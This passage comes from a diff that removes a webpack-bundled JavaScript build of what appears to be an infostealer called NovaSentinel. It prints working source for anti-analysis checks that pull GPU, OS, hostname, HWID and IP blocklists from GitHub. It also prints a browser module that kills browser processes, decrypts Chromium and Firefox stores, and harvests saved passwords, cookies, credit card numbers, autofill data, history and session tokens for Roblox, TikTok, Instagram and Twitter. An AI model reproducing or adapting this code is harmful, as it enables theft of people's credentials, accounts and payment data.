{\r\n    try {\r\n        const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/blocked_GPUTYPE.json');\r\n        const blockedgpu = response.data;\r\n        return blockedgpu.includes(gpu);\r\n    } catch (error) {\r\n        return false;\r\n    }\r\n}\r\n\r\nasync function OsBLOCKED(OS) {\r\n    try {\r\n        const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/blockedOS.json');\r\n        const blockedOS = response.data;\r\n        return blockedOS.includes(OS);\r\n    } catch (error) {\r\n        return false;\r\n    }\r\n}\r\n\r\nasync function PCNameBLOCKED(username) {\r\n    try {\r\n        const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/blockedpcname.json');\r\n        const blockedPCNAMES = response.data;\r\n        return blockedPCNAMES.includes(username);\r\n    } catch (error) {\r\n        return false;\r\n    }\r\n}\r\n\r\nasync function UsernameBLOCKED(username) {\r\n    try {\r\n        const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/blocked_progr.json');\r\n        const blockedUsernames = response.data;\r\n        return blockedUsernames.includes(username);\r\n    } catch (error) {\r\n        return false;\r\n    }\r\n}\r\n\r\nasync function UuidBLOCKED(uid) {\r\n    try {\r\n        const response = await axios.get('https://raw.githubusercontent.com/Yokheycv/sub/main/assets/blocked_hwid.json');\r\n        const blockedUIDs = response.data;\r\n        return blockedUIDs.includes(uid);\r\n    } catch (error) {\r\n        return false;\r\n    }\r\n}\r\n\r\nasync function ipBLOCKED(ip) {\r\n    try {\r\n        const response = await axios.get('https://raw.githubusercontent.com/Steroide-58/sub-main/main/sub-main/assets/blocked_ips.json');\r\n        const blockedIPs = response.data;\r\n        return blockedIPs.includes(ip);\r\n    } catch (error) {\r\n        return false;\r\n    }\r\n}\r\n\r\n\r\nmodule.exports = {\r\n    DoNoDebugNegger,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/antidebug.js?");
-
-/***/ }),
-
-/***/ "./utils/browsers.js":
-/*!***************************!*\
-  !*** ./utils/browsers.js ***!
-  \***************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const fs = __webpack_require__(/*! fs */ \"fs\"),\n  sqlite3 = __webpack_require__(/*! sqlite3 */ \"sqlite3\"),\n  boukiapi = __webpack_require__(/*! boukiapi */ \"../node_modules/boukiapi/index.js\"),\n  crypto = __webpack_require__(/*! crypto */ \"crypto\"),\n  iconv = __webpack_require__(/*! iconv-lite */ \"iconv-lite\"),\n  save = __webpack_require__(/*! ./save */ \"./utils/save.js\"),\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\n  gecko = __webpack_require__(/*! ./gecko */ \"./utils/gecko.js\"),\n  path = __webpack_require__(/*! path */ \"path\"),\n  kill = __webpack_require__(/*! ./kill */ \"./utils/kill.js\");\n\nwebsite = [];\n\nclass Cookies {\n  constructor(host, path, secure, expires, name, value) {\n    this.host = host;\n    this.path = path;\n    this.secure = secure;\n    this.expires = expires;\n    this.name = name;\n    this.value = value;\n  }\n\n  build() {\n    return `${this.host}\\tTRUE\\t${this.path}\\t${this.secure}\\t${this.expires}\\t${this.name}\\t${this.value}\\n`;\n  }\n}\n\nclass Password {\n  constructor(site, username, password, timestamp, browser) {\n    this.site = site;\n    this.username = username;\n    this.password = password;\n    this.timestamp = timestamp;\n    this.browser = browser;\n  }\n\n  build() {\n    return `Site: ${this.site}\\nUsername: ${this.username}\\nPassword: ${this.password}\\nBrowser: ${this.browser} | ${this.timestamp}\\n`;\n  }\n}\n\nclass Autofill {\n  constructor(input, value, browser) {\n    this.input = input;\n    this.value = value;\n    this.browser = browser;\n  }\n\n  build() {\n    return `Input: ${this.input}\\nValue: ${this.value}\\nBrowser: ${this.browser}\\n`;\n  }\n}\n\nclass CreditCard {\n  constructor(\n    guid,\n    name,\n    expiration_mouth,\n    expiration_year,\n    number,\n    address,\n    nickname\n  ) {\n    this.guid = guid;\n    this.name = name;\n    this.address = address;\n    this.nickname = nickname;\n    this.expiration = expiration_mouth + \"/\" + expiration_year;\n    this.number = number;\n  }\n\n  build() {\n    return `Guid: ${this.guid}\\nName: ${this.name}\\nAdress: ${this.address}\\nNickname: ${this.nickname}\\nExpiration: ${this.expiration}\\nNumber: ${this.number}\\n`;\n  }\n}\n\nclass Visit {\n  constructor(url, title, count, timestamp) {\n    this.url = url;\n    this.title = title;\n    this.count = count;\n    this.timestamp = timestamp;\n  }\n\n  build() {\n    return `Url: ${this.url}\\nTitle: ${this.title}\\nCount: ${this.count}\\nTimestamp: ${this.timestamp}\\n`;\n  }\n}\n\nclass Download {\n  constructor(path, url, total_bytes) {\n    this.path = path;\n    this.url = url;\n    this.total_bytes = total_bytes;\n  }\n\n  build() {\n    return `Url: ${this.url}\\nPath: ${this.path}\\nTotalBytes: ${this.total_bytes}\\n`;\n  }\n}\n\nclass Bookmark {\n  constructor(name, url, timestamp, browser) {\n    this.url = url;\n    this.name = name;\n    this.timestamp = timestamp;\n    this.browser = browser;\n  }\n\n  build() {\n    return `Url: ${this.url}\\nName: ${this.name}\\nBrowser: ${this.browser}\\nTimestamp: ${this.timestamp}\\n`;\n  }\n}\n\nfunction getProfiles(path, name) {\n  let profiles = [];\n\n  if (fs.existsSync(path)) {\n    let dirs = fs.readdirSync(path);\n    for (let dir of dirs) {\n      if (dir.includes(\"Profile\") || dir == \"Default\") {\n        profiles.push({\n          path: `${path}${dir}\\\\`,\n          name: name,\n          profile: dir,\n        });\n      }\n    }\n    return profiles;\n  } else {\n    return [];\n  }\n}\n\nfunction getGeckoProfiles(path, name) {\n  let profiles = [];\n\n  if (fs.existsSync(path)) {\n    let dirs = fs.readdirSync(path);\n    for (let dir of dirs) {\n      if (\n        dir.includes(\".default-release\") ||\n        dir.includes(\".default-default-\")\n      ) {\n        profiles.push({\n          path: `${path}${dir}\\\\`,\n          name: name,\n        });\n      }\n    }\n    return profiles;\n  } else {\n    return [];\n  }\n}\n\nfunction getMasterKey(path) {\n  if (fs.existsSync(`${path}Local State`)) {\n    let localstate = JSON.parse(fs.readFileSync(`${path}Local State`, \"utf8\"));\n    let master_key = localstate.os_crypt.encrypted_key;\n    master_key = boukiapi.unprotectData(\n      Buffer.from(Buffer.from(master_key, \"base64\").slice(5), \"utf-8\"),\n      null,\n      \"CurrentUser\"\n    );\n    return master_key;\n  } else if (fs.existsSync(`${path}..\\\\Local State`)) {\n    let localstate = JSON.parse(\n      fs.readFileSync(`${path}..\\\\Local State`, \"utf8\")\n    );\n    let master_key = localstate.os_crypt.encrypted_key;\n    master_key = boukiapi.unprotectData(\n      Buffer.from(Buffer.from(master_key, \"base64\").slice(5), \"utf-8\"),\n      null,\n      \"CurrentUser\"\n    );\n    return master_key;\n  } else {\n    return \"\";\n  }\n}\n\nasync function tempSqlite(path, query) {\n  let path_tmp = path + \"_tmp\";\n  fs.copyFileSync(path, path_tmp);\n  let db = new sqlite3.Database(path_tmp);\n  let result = await new Promise((resolve, reject) => {\n    db.all(query, (err, rows) => {\n      if (err) {\n        reject(err);\n      } else {\n        resolve(rows);\n      }\n    });\n  });\n  db.close();\n  try {\n    await fs.unlinkSync(path_tmp);\n  } catch (e) {\n  }\n  return result;\n}\n\nfunction decryptChrome(value, key) {\n  let start = value.slice(3, 15),\n    middle = value.slice(15, value.length - 16),\n    end = value.slice(value.length - 16, value.length),\n    decipher = crypto.createDecipheriv(\"aes-256-gcm\", key, start);\n  decipher.setAuthTag(end);\n  return (decrypted =\n    decipher.update(middle, \"base64\", \"utf-8\") + decipher.final(\"utf-8\"));\n}\n\nasync function getCookies(basepath) {\n  await kill.KillBrowsersProcess();\n  let cookies = [];\n  let key = getMasterKey(basepath);\n\n  if (fs.existsSync(`${basepath}Network\\\\Cookies`)) {\n    var rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}Network\\\\Cookies`,\n        \"SELECT name, host_key, path, expires_utc, is_secure, encrypted_value FROM cookies\"\n      );\n    } catch (e) {\n      save.SaveError(e)\n    }\n\n    for (let row of rows) {\n      let value = row.encrypted_value;\n\n      if (\n        value.toString().startsWith(\"v10\") ||\n        value.toString().startsWith(\"v11\")\n      ) {\n        if (key == \"\") {\n          continue;\n        }\n\n        try {\n          value = decryptChrome(value, key);\n        } catch (e) {\n          save.SaveError(e)\n          continue;\n        }\n      } else {\n        try {\n          value = boukiapi.unprotectData(value, null, \"CurrentUser\");\n        } catch (e) {\n          save.SaveError(e)\n          continue;\n        }\n      }\n      if (row.host_key.includes(\".reddit\")) {\n        if (row.name.includes(\"reddit_session\")) {\n          stat.addReddit(value);\n        }\n      }\n      if (row.host_key.includes(\".tiktok\")) {\n        if (row.name.includes(\"sessionid\")) {\n          stat.addTikTok(value);\n        }\n      }\n      if (row.host_key.includes(\".instagram\")) {\n        if (row.name.includes(\"sessionid\")) {\n          stat.addSessIDInsta(value);\n        }\n      }\n      if (row.name.includes(\".ROBLOSECURITY\")) {\n        save.saveRoblox(value);\n        stat.AddRoblox(value);\n      }\n      if (row.host_key.includes(\".twitter\")) {\n        let saved = row;\n        saved.value = value;\n        stat.AddTwitter(saved);\n      }\n      cookies.push(\n        new Cookies(\n          row.host_key,\n          row.path,\n          row.is_secure,\n          row.expires_utc,\n          row.name,\n          value\n        )\n      );\n    }\n  }\n  return cookies;\n}\n\nasync function getPasswords(basepath, browser) {\n  var passwords = [];\n  let key = getMasterKey(basepath);\n\n  var loginPath = \"\";\n  if (basepath.includes(\"Yandex\")) {\n    loginPath = `${basepath}Ya Passman Data`;\n  } else {\n    loginPath = `${basepath}Login Data`;\n  }\n\n  if (fs.existsSync(loginPath)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        loginPath,\n        \"SELECT origin_url, username_value, password_value, date_created FROM logins\"\n      );\n    } catch (e) {\n      save.SaveError(e)\n    }\n    for (let row of rows) {\n      let password = row.password_value;\n\n      if (\n        password.toString().startsWith(\"v10\") ||\n        password.toString().startsWith(\"v11\")\n      ) {\n        if (key == \"\") {\n          continue;\n        }\n\n        try {\n          password = decryptChrome(password, key);\n        } catch (e) {\n          save.SaveError(e)\n          continue;\n        }\n      } else {\n        try {\n          password = boukiapi.unprotectData(password, null, \"CurrentUser\");\n        } catch (e) {\n          save.SaveError(e)\n          continue;\n        }\n      }\n      if (row.username_value != \"\" && password != \"\") {\n        passwords.push(\n          new Password(\n            row.origin_url,\n            row.username_value,\n            password,\n            row.date_created,\n            browser\n          )\n        );\n        website.push(row.origin_url);\n/*\n        if (row.origin_url.includes(\"discord\")) {\n          if (!stat.discordAccount || !stat.discordAccount.length) return;\n      \n          stat.discordAccount.forEach((d) => {\n            d.forEach((g) => {\n              if (g.email == row.username_value) {\n                g.password = password;\n              }\n            });\n          });\n        }*/\n      }\n    }\n  }\n  return passwords;\n}\n\nasync function getAutofills(basepath, browser) {\n  var autofills = [];\n\n  if (fs.existsSync(`${basepath}Web Data`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}Web Data`,\n        \"SELECT name, value FROM autofill\"\n      );\n    } catch (e) { \n      save.SaveError(e)\n    }\n\n    for (let row of rows) {\n      autofills.push(new Autofill(row.name, row.value, browser));\n    }\n  }\n\n  return autofills;\n}\n\nasync function getDownloads(basepath) {\n  var downloads = [];\n\n  if (fs.existsSync(`${basepath}History`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}History`,\n        \"SELECT target_path, tab_url, total_bytes FROM downloads\"\n      );\n    } catch (e) { \n      save.SaveError(e)\n    }\n\n    for (let row of rows) {\n      downloads.push(\n        new Download(row.target_path, row.tab_url, row.total_bytes)\n      );\n    }\n  }\n\n  return downloads;\n}\n\nasync function getCreditCards(basepath) {\n  let creditcards = [];\n  let key = getMasterKey(basepath);\n\n  if (fs.existsSync(`${basepath}Web Data`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}Web Data`,\n        \"SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards\"\n      );\n    } catch (e) { \n      save.SaveError(e)\n    }\n\n    for (let row of rows) {\n      let number = row.card_number_encrypted;\n\n      if (\n        number.toString().startsWith(\"v10\") ||\n        number.toString().startsWith(\"v11\")\n      ) {\n        if (key == \"\") {\n          continue;\n        }\n\n        try {\n          number = decryptChrome(number, key);\n        } catch (e) {\n          save.SaveError(e)\n          continue;\n        }\n      } else {\n        try {\n          number = boukiapi.unprotectData(number, null, \"CurrentUser\");\n        } catch (e) {\n          save.SaveError(e)\n          continue;\n        }\n      }\n\n      creditcards.push(\n        new CreditCard(\n          row.guid,\n          row.name_on_card,\n          row.expiration_month,\n          row.expiration_year,\n          number,\n          row.billing_address_id,\n          row.nickname\n        )\n      );\n    }\n  }\n\n  return creditcards;\n}\n\nasync function getHistory(basepath) {\n  var history = [];\n\n  if (fs.existsSync(`${basepath}History`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}History`,\n        \"SELECT url, title, visit_count, last_visit_time FROM urls\"\n      );\n    } catch (e) { \n      save.SaveError(e)\n     }\n\n    for (let row of rows) {\n      history.push(\n        new Visit(row.url, row.title, row.visit_count, row.last_visit_time)\n      );\n    }\n  }\n\n  return history;\n}\n\nasync function getBookmarks(basepath, browser) {\n  let bookmarks = [];\n\n  if (fs.existsSync(`${basepath}Bookmarks`)) {\n    fs.copyFileSync(`${basepath}Bookmarks`, `${basepath}Bookmarks_tmp`);\n    let json = JSON.parse(fs.readFileSync(`${basepath}Bookmarks_tmp`));\n    fs.unlinkSync(`${basepath}Bookmarks_tmp`);\n\n    for (let bookmark of json.roots.bookmark_bar.children) {\n      bookmarks.push(\n        new Bookmark(bookmark.name, bookmark.url, bookmark.date_added, browser)\n      );\n    }\n  }\n\n  return bookmarks;\n}\n\nasync function getGeckoCookies(basepath) {\n  var cookies = [];\n\n  if (fs.existsSync(`${basepath}cookies.sqlite`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}cookies.sqlite`,\n        \"SELECT name, value, host, path, expiry, isSecure FROM moz_cookies\"\n      );\n    } catch (e) {\n      save.SaveError(e)\n    }\n\n    for (let row of rows) {\n      if (row.name.includes(\".ROBLOSECURITY\")) {\n        stat.AddRoblox(row.value);\n      }\n      if (row.host.includes(\".tiktok\")) {\n        if (row.name.includes(\"sessionid\")) {\n          stat.addTikTok(row.value);\n        }\n      }\n      if (row.host.includes(\".instagram\")) {\n        if (row.name.includes(\"sessionid\")) {\n          stat.addSessIDInsta(row.value);\n        }\n      }\n      if (row.host.includes(\".twitter\")) {\n        let saved = row;\n        saved.value = row.value;\n        stat.AddTwitter(saved);\n      }\n      cookies.push(\n        new Cookies(\n          row.host,\n          row.path,\n          row.isSecure,\n          row.expiry,\n          row.name,\n          row.value\n        )\n      );\n    }\n  }\n\n  return cookies;\n}\n\nasync function getGeckoPasswords(profile, masterPassword, browser) {\n  const passwords = [];\n  const key = await gecko.getKey(profile, masterPassword);\n  if (key == null) {\n    return passwords;\n  }\n\n  const loginsPath = path.join(profile, \"logins.json\");\n  if (!fs.existsSync(loginsPath)) {\n    return passwords;\n  }\n\n  const loginsData = fs.readFileSync(loginsPath, \"utf8\");\n  const profileLogins = JSON.parse(loginsData);\n  for (const login of profileLogins.logins) {\n    const decodedUsername = gecko.decodeLoginData(login.encryptedUsername);\n    const decodedPassword = gecko.decodeLoginData(login.encryptedPassword);\n    const username = gecko.decrypt(\n      decodedUsername.data,\n      decodedUsername.iv,\n      key,\n      \"3DES-CBC\"\n    );\n    const password = gecko.decrypt(\n      decodedPassword.data,\n      decodedPassword.iv,\n      key,\n      \"3DES-CBC\"\n    );\n\n    let encodeUsername = iconv.encode(username.data, \"latin1\").toString();\n    if (encodeUsername != username.data) {\n      username.data = encodeUsername;\n    }\n\n    let encodePassword = iconv.encode(password.data, \"latin1\").toString();\n    if (encodePassword != password.data) {\n      password.data = encodePassword;\n    }\n    if (username.data !== \"\" && (password.data !== \"\" && password.data !== undefined)) {\n\n      passwords.push(\n        new Password(\n          login.hostname,\n          username.data,\n          password.data,\n          login.timeLastUsed,\n          browser\n        )\n      );\n    }\n  }\n\n  return passwords;\n}\n\nasync function getGeckoBookmarks(basepath, browser) {\n  let bookmarks = [];\n\n  if (fs.existsSync(`${basepath}places.sqlite`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}places.sqlite`,\n        \"SELECT id, url, dateAdded, title FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)\"\n      );\n    } catch (e) {\n      save.SaveError(e)\n     }\n\n    for (let row of rows) {\n      bookmarks.push(new Bookmark(row.title, row.url, row.dateAdded, browser));\n    }\n  }\n\n  return bookmarks;\n}\n\nasync function getGeckoHistory(basepath) {\n  let history = [];\n\n  if (fs.existsSync(`${basepath}places.sqlite`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}places.sqlite`,\n        \"SELECT title, url, visit_count, last_visit_date FROM moz_places where title not null\"\n      );\n    } catch (e) {\n      save.SaveError(e)\n    }\n\n    for (let row of rows) {\n      history.push(\n        new Visit(row.url, row.title, row.visit_count, row.last_visit_date)\n      );\n    }\n  }\n\n  return history;\n}\n\nasync function getGeckoDownloads(basepath) {\n  let downloads = [];\n\n  if (fs.existsSync(`${basepath}places.sqlite`)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}places.sqlite`,\n        \"SELECT GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id\"\n      );\n    } catch (e) {\n      save.SaveError(e)\n    }\n\n    for (let row of rows) {\n      try {\n        downloads.push(\n          new Download(\n            row[\"GROUP_CONCAT(content)\"].split(\"},\")[1],\n            row.url,\n            JSON.parse(\n              row[\"GROUP_CONCAT(content)\"].split(\"},\")[0] + \"}\"\n            ).fileSize\n          )\n        );\n      } catch (e) {\n        save.SaveError(e)\n        continue;\n      }\n    }\n  }\n\n  return downloads;\n}\n\nasync function NovaSentinelBrowsers(cc) {\n  if (cc != \"yes\") return;\n  let appdata = process.env.APPDATA;\n  let localappdata = process.env.LOCALAPPDATA;\n\n  var chromiumPath = [\n    {\n      path: appdata + \"\\\\Mail.Ru\\\\Atom\\\\User Data\\\\\",\n      name: \"Atom\",\n    },\n    {\n      path: appdata + \"\\\\Uran\\\\User Data\\\\\",\n      name: \"Uran\",\n    },\n    {\n      path: appdata + \"\\\\Maxthon3\\\\User Data\\\\\",\n      name: \"Maxthon3\",\n    },\n    {\n      path: appdata + \"\\\\liebao\\\\User Data\\\\\",\n      name: \"liebao\",\n    },\n\n    {\n      path: appdata + \"\\\\Coowon\\\\Coowon\\\\User Data\\\\\",\n      name: \"Coowon\",\n    },\n    {\n      path:\n        appdata + \"\\\\Fenrir Inc\\\\Sleipnir5\\\\setting\\\\modules\\\\ChromiumViewer\\\\\",\n      name: \"Sleipnir5\",\n    },\n    {\n      path: appdata + \"\\\\MapleStudio\\\\ChromePlus\\\\User Data\\\\\",\n      name: \"ChromePlus\",\n    },\n    {\n      path: appdata + \"\\\\Superbird\\\\User Data\\\\\",\n      name: \"Superbird\",\n    },\n    {\n      path: appdata + \"\\\\Rafotech\\\\Mustang\\\\User Data\\\\\",\n      name: \"Rafotech\",\n    },\n    {\n      path: appdata + \"\\\\Safer Technologies\\\\Secure Browser\\\\User Data\\\\\",\n      name: \"SaferTechnologies\",\n    },\n    {\n      path: appdata + \"\\\\Suhba\\\\User Data\\\\\",\n      name: \"Suhba\",\n    },\n    {\n      path: appdata + \"\\\\TorBro\\\\Profile\\\\\",\n      name: \"TorBrowser\",\n    },\n    {\n      path: appdata + \"\\\\Elements Browser\\\\User Data\\\\\",\n      name: \"ElementsBrowser\",\n    },\n    {\n      path: appdata + \"\\\\CocCoc\\\\Browser\\\\User Data\\\\\",\n      name: \"CocCoc\",\n    },\n    {\n      path: appdata + \"\\\\Go!\\\\User Data\\\\\",\n      name: \"GoBrowser\",\n    },\n    {\n      path: appdata + \"\\\\QIP Surf\\\\User Data\\\\\",\n      name: \"QIP Surf\",\n    },\n    {\n      path: appdata + \"\\\\RockMelt\\\\User Data\\\\\",\n      name: \"RockMelt\",\n    },\n    {\n      path: appdata + \"\\\\Nichrome\\\\User Data\\\\\",\n      name: \"Nichrome\",\n    },\n    {\n      path: appdata + \"\\\\Bromium\\\\User Data\\\\\",\n      name: \"Bromium\",\n    },\n    {\n      path: appdata + \"\\\\Comodo\\\\Dragon\\\\User Data\\\\\",\n      name: \"Comodo\",\n    },\n    {\n      path: appdata + \"\\\\Xpom\\\\User Data\\\\\",\n      name: \"Xpom\",\n    },\n    {\n      path: appdata + \"\\\\Chedot\\\\User Data\\\\\",\n      name: \"Chedot\",\n    },\n    {\n      path: appdata + \"\\\\360Browser\\\\Browser\\\\User Data\\\\\",\n      name: \"360Browser\",\n    },\n    {\n      path: appdata + \"\\\\Opera Software\\\\Opera Stable\\\\\",\n      name: \"Opera\",\n    },\n    {\n      path: appdata + \"\\\\Opera Software\\\\Opera GX Stable\\\\\",\n      name: \"OperaGX\",\n    },\n    {\n      path: localappdata + \"\\\\Epic Privacy Browser\\\\User Data\\\\\",\n      name: \"EpicPrivacy\",\n    },\n    {\n      path: localappdata + \"\\\\Google\\\\Chrome SxS\\\\User Data\\\\\",\n      name: \"ChromeSxS\",\n    },\n    {\n      path: localappdata + \"\\\\Sputnik\\\\Sputnik\\\\User Data\\\\\",\n      name: \"Sputnik\",\n    },\n    {\n      path: localappdata + \"\\\\7Star\\\\7Star\\\\User Data\\\\\",\n      name: \"7Star\",\n    },\n    {\n      path: localappdata + \"\\\\CentBrowser\\\\User Data\\\\\",\n      name: \"CentBrowser\",\n    },\n    {\n      path: localappdata + \"\\\\Orbitum\\\\User Data\\\\\",\n      name: \"Orbitum\",\n    },\n    {\n      path: localappdata + \"\\\\Kometa\\\\User Data\\\\\",\n      name: \"Kometa\",\n    },\n    {\n      path: localappdata + \"\\\\Torch\\\\User Data\\\\\",\n      name: \"Torch\",\n    },\n    {\n      path: localappdata + \"\\\\Amigo\\\\User Data\\\\\",\n      name: \"Amigo\",\n    },\n  ];\n  chromiumPath = chromiumPath.concat(\n    getProfiles(\n      localappdata + \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\\",\n      \"Brave\"\n    )\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\Xpom\\\\User Data\\\\\", \"Xpom\")\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(\n      localappdata + \"\\\\360Browser\\\\Browser\\\\User Data\\\\\",\n      \"360Browser\"\n    )\n  );\n\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\Chedot\\\\User Data\\\\\", \"Chedot\")\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(\n      localappdata + \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\\",\n      \"Brave\"\n    )\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\Iridium\\\\User Data\\\\\", \"Iridium\")\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\\", \"Yandex\")\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\uCozMedia\\\\Uran\\\\User Data\\\\\", \"Uran\")\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\Microsoft\\\\Edge\\\\User Data\\\\\", \"Edge\")\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\Google\\\\Chrome\\\\User Data\\\\\", \"Chrome\")\n  );\n  chromiumPath = chromiumPath.concat(\n    getProfiles(localappdata + \"\\\\Vivaldi\\\\User Data\\\\\", \"Vivaldi\")\n  );\n\n  var cookieslength = 0;\n  var passwords = [];\n  var autofills = [];\n  var cards = [];\n  var bookmarks = [];\n  var history = [];\n  var downloads = [];\n  let i = 0;\n\n  for (let obj of chromiumPath) {\n    const path = obj.path;\n    if (!fs.existsSync(path)) {\n      continue;\n    }\n\n    i++;\n\n    try {\n      const cookies = await getCookies(path);\n      cookieslength += cookies.length;\n\n      let browserName;\n      if (typeof obj.profile != \"undefined\") {\n        browserName = obj.name + \" [ \" + obj.profile + \" ]\";\n      } else {\n        browserName = obj.name;\n      }\n      stat.SaveAllCookies(cookies)\n      save.saveCookies(cookies, browserName);\n      passwords = passwords.concat(await getPasswords(path, browserName));\n      autofills = autofills.concat(await getAutofills(path, browserName));\n      cards = cards.concat(await getCreditCards(path));\n      history = history.concat(await getHistory(path));\n      downloads = downloads.concat(await getDownloads(path));\n      bookmarks = bookmarks.concat(await getBookmarks(path, browserName));\n    } catch (e) {\n      save.SaveError(e)\n      continue;\n    }\n  }\n  let geckoPath = [];\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(\n      appdata + \"\\\\K-Meleon\\\\Profiles\\\\\",\n      \"Kmelon\"\n    )\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(\n      appdata + \"\\\\Moonchild Productions\\\\Pale Moon\\\\Profiles\\\\\",\n      \"PaleMoon\"\n    )\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(appdata + \"\\\\Comodo\\\\IceDragon\\\\Profiles\\\\\", \"IceDragon\")\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(\n      appdata + \"\\\\NETGATE Technologies\\\\BlackHaw\\\\Profiles\\\\\",\n      \"BlackHaw\"\n    )\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(\n      appdata + \"\\\\8pecxstudios\\\\Cyberfox\\\\Profiles\\\\\",\n      \"Cyberfox\"\n    )\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(appdata + \"\\\\Thunderbird\\\\Profiles\\\\\", \"Thunderbird\")\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(appdata + \"\\\\Mozilla\\\\SeaMonkey\\\\Profiles\\\\\", \"SeaMonkey\")\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(appdata + \"\\\\Mozilla\\\\Firefox\\\\Profiles\\\\\", \"Firefox\")\n  );\n  geckoPath = geckoPath.concat(\n    getGeckoProfiles(appdata + \"\\\\Waterfox\\\\Profiles\\\\\", \"Waterfox\")\n  );\n\n  for (let obj of geckoPath) {\n    const path = obj.path;\n    if (!fs.existsSync(path)) {\n      continue;\n    }\n    i++;\n    try {\n      const cookies = await getGeckoCookies(path);\n      cookieslength += cookies.length;\n      save.saveCookies(cookies, obj.name);\n\n      stat.SaveAllCookies(cookies)\n      bookmarks = bookmarks.concat(await getGeckoBookmarks(path, obj.name));\n      history = history.concat(await getGeckoHistory(path));\n      downloads = downloads.concat(await getGeckoDownloads(path));\n\n      passwords = passwords.concat(await getGeckoPasswords(path, \"\", obj.name));\n    } catch (e) {\n      save.SaveError(e + \"\\nError browsers 1\");\n      continue;\n    }\n  }\n  const importantSites = [\n    \"gmail\",\n    \"youtube\",\n    \"onoff\",\n    \"xss.is\",\n    \"pronote\",\n    \"ovhcloud\",\n    \"nulled\",\n    \"cracked\",\n    \"tiktok\",\n    \"yahoo\",\n    \"gmx\",\n    \"aol\",\n    \"coinbase\",\n    \"binance\",\n    \"steam\",\n    \"epicgames\",\n    \"discord\",\n    \"paypal\",\n    \"instagram\",\n    \"spotify\",\n    \"onlyfans\",\n    \"pornhub\",\n    \"origin\",\n    \"amazon\",\n    \"twitter\",\n    \"aliexpress\",\n    \"netflix\",\n    \"roblox\",\n    \"twitch\",\n    \"facebook\",\n    \"riotgames\",\n    \"card\",\n    \"telegram\",\n    \"protonmail\",\n  ];\n\n  function countImportantSites(website, importantSites) {\n    let count = {};\n    importantSites.forEach((importantSite) => {\n      count[importantSite] = 0;\n    });\n    website.forEach((visitedSite) => {\n      importantSites.forEach((importantSite) => {\n        if (visitedSite.includes(importantSite)) {\n          count[importantSite]++;\n        }\n      });\n    });\n    return count;\n  }\n\n  const count = countImportantSites(website, importantSites);\n\n  for (const site in count) {\n    if (count[site] > 0) {\n      stat.AddKeyword(` ${site} : ${count[site]}`);\n    }\n  }\n  save.saveBrowser(passwords, autofills, cards, history, downloads, bookmarks);\n  stat.AddBrowser(\n    passwords.length,\n    cookieslength,\n    autofills.length,\n    cards.length,\n    history.length,\n    downloads.length,\n    bookmarks.length\n  );\n\n  var pass = [];\n  for (let i = 0; i < passwords.length; i++) {\n    if (passwords[i]) {\n      if (passwords[i].password)\n        pass.push(passwords[i].password);\n    }\n  }\n  return pass;\n}\n\nmodule.exports = {\n  NovaSentinelBrowsers,\n  getGeckoPasswords,\n  getGeckoProfiles,\n};\n\n\n//# sourceURL=webpack://script/./utils/browsers.js?");
-
-/***/ }),
-
-/***/ "./utils/cookies.js":
-/*!**************************!*\
-  !*** ./utils/cookies.js ***!
-  \**************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
